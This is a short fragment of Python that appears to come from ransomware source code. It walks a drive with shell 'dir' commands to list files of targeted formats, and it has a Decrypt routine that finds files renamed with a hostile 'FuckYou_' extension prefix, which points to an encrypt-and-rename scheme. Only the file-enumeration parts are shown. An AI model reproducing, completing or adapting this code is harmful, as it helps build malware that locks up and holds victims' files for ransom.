    ...
    for Formatt in fileFormats:
        try:
            with open("log.txt" , "w") as errorlog:
                cmd = check_output(drivee+" && dir /S /B *."+Formatt , shell=True , stderr=errorlog).decode().replace("\\r","").split("\\n")
                for file in cmd:
...
def Decrypt(drivee):
    for Formatt in fileFormats:
        try:
            with open("log.txt" , "w") as errorlog:
                cmd = check_output(drivee+" && dir /S /B *.FuckYou_"+Formatt , shell=True , stderr=errorlog)
